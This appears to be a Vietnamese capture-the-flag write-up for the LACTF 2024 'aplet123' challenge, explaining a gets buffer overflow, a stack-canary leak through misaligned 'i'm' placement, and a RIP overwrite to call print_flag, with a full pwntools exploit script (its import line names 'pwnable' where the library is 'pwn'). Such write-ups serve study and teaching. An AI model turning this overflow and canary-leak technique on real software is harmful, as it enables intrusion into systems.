# [LACTF-2024] aplet123
<p>Dòng 20, sử dụng gets để đọc nội dung vào haystack có kích thước 72 byte -> Buffer overflow. Để kiểm soát giá trị RIP nằm trên stack thì cần thoát khỏi 3 vòng lặp while. Dòng 21 sử dụng strstr để tìm chuỗi con "i'm" trong haystack, nếu tìm thấy thì v6 trỏ đến vị trí bắt đầu của "i'm" -> Cần chứa chuỗi "i'm" để out vòng lặp đầu tiên. Dòng 26, so sánh nếu chuỗi trong haystack khác với chuỗi "please give me the flag" thì out vòng lặp thứ hai. Dòng 32, so sánh nếu chuỗi trong haystack khác với chuỗi "bye" thì out vòng lặp thứ ba.</p>

![alt text](/thanhlai/post/pwnable/image/post2/image.png)

<p>Quan sát bảng Functions, có hàm print_flag dùng để in ra nội dung flag -> Mục tiêu: kiểm soát giá trị RIP để thực thi hàm print_flag.</p>

![alt text](/thanhlai/post/pwnable/image/post2/image-1.png)

<p>Cơ chế canary đang được bật -> Phải leak được giá trị canary. Ta có thể lợi dụng hàm printf để leak ra giá trị canary. </p>

![alt text](/thanhlai/post/pwnable/image/post2/image-7.png)

<p>Ta sẽ để chuỗi "i'm" nằm từ byte thứ 70 đến 72. Khi đó, strstr sẽ trả về con trỏ tại byte thứ 70 dẫn đến v6 + 4 sẽ là byte thứ 2 của canary -> In được 7 byte canary (ngoại trừ null byte đầu tiên).</p>

![alt text](/thanhlai/post/pwnable/image/post2/image-5.png)

<p>Script exploit:</p>

```
from pwnable import *

p = process('./aplet123') 
elf = ELF('./aplet123')

payload = b'a' * 69 + b"i'm"
p.sendlineafter(b'hello', payload)

p.recvuntil(b"hi ")
leaked = p.recv(7)
canary = u64(b'\x00' + leaked)

payload = b'a' * 72     
payload += p64(canary)     
payload += p64(0)         
payload += p64(elf.sym['print_flag'])  

p.sendline(payload)
p.sendline(b'bye')
p.interactive()
```
<p>Chạy script và lấy được flag thành công.</p>

![alt text](/thanhlai/post/pwnable/image/post2/image-6.png)